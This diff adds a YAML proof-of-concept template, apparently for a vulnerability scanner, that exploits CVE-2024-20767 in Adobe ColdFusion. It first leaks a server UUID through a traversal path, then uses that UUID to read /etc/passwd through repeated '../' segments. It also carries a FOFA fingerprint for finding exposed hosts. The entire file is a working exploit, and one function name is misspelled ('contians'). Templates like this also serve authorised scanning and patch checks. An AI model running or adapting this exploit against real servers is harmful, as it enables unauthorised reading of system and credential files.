@@ -1,0 +1,23 @@
+id: poc-yaml-adobe-coldfusion-anyfile-read
+info:
+  name: Adobe ColdFusion 任意文件读取漏洞(CVE-2024-20767)
+  severity: high
+  tags:
+  - CVE-2024-20767
+  - 两高一弱
+  finger: coldfusion
+  fofa: app="Adobe-ColdFusion"
+requests:
+- method: GET
+  path: /hax/..CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat
+  expression: contains(body,"uuid") && contains(body,"wddxPacket")
+  output:
+  - regex_match(body,`<var name='uuid'><string>(?P<uuid>.*)</string>`)
+- method: GET
+  path: /hax/../pms?module=logging&file_name=../../../../../../../../../../../../../../../../../../etc/passwd&number_of_lines=1000
+  headers:
+    uuid: '{{.uuid}}'
+  expression: status_code == 200 && contians(body,"/bin/bash") && !contains(body,"<")
+    && contains(content_type,"application/json")
+variables: {}
+transport: http
